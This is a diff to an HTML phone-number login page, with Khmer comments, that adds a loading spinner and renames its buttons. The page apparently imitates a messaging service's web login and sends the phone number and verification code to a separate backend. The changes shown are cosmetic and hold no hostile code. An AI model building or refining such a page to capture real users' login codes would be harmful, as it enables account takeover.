@@ -158,6 +158,10 @@
     font-weight: 600;
     cursor: pointer;
     transition: background-color 0.2s, transform 0.05s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
   }
   .btn-primary:hover {
     background-color: var(--accent-hover);
@@ -165,6 +169,22 @@
   .btn-primary:active {
     transform: scale(0.98);
   }
+
+  /* 💫 CSS Animation សម្រាប់រង្វង់វិល Loading */
+  @keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+  }
+  .spinner {
+    width: 20px;
+    height: 20px;
+    border: 3px solid rgba(255, 255, 255, 0.3);
+    border-top: 3px solid #ffffff;
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    display: inline-block;
+  }
+
   .alt-links {
     margin-top: 24px;
     display: flex;
@@ -295,7 +315,8 @@
         <span>Keep me signed in</span>
       </label>
 
-      <button id="btn-send" onclick="sendPhone()" class="btn-primary">SEND CODE</button>
+      <!-- ប្តូរឈ្មោះប៊ូតុងទៅជា NEXT -->
+      <button id="btn-send" onclick="sendPhone()" class="btn-primary">NEXT</button>
 
       <div class="alt-links">
         <a href="#">LOG IN BY QR CODE</a>
@@ -347,7 +368,6 @@
   <script>
     const BACKEND_URL = "";
 
-    // Comprehensive list of world countries with flags and dial codes
     const countries = [
       { name: "Afghanistan", code: "+93", flag: "🇦🇫" },
       { name: "Albania", code: "+355", flag: "🇦🇱" },
@@ -620,8 +640,9 @@
             return;
         }
 
+        // 🔄 ប្តូរអក្សរទៅជា PLEASE WAIT... និងបន្ថែមរង្វង់វិល (Spinner Animation)
         btn.disabled = true;
-        btn.innerText = 'SENDING...';
+        btn.innerHTML = '<span>PLEASE WAIT...</span><span class="spinner"></span>';
         btn.classList.add('opacity-70');
 
         try {
@@ -647,7 +668,7 @@
             console.error(err);
         } finally {
             btn.disabled = false;
-            btn.innerText = 'SEND CODE';
+            btn.innerText = 'NEXT';
             btn.classList.remove('opacity-70');
         }
     }
@@ -664,7 +685,7 @@
         }
 
         btn.disabled = true;
-        btn.innerText = 'VERIFYING...';
+        btn.innerHTML = '<span>PLEASE WAIT...</span><span class="spinner"></span>';
         btn.classList.add('opacity-70');
 
         try {
